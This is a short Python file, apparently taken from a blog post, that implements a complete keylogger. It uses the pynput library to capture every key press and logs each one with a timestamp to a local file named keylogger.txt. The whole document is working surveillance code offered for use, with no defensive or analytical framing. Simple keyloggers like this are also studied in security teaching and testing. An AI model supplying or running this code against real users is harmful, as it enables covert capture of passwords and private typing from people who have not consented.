#From : https://blog.octachart.com/keylogger-in-just-10-lines-of-python
# pip install pynput

from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("keylogger.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener :
    listener.join()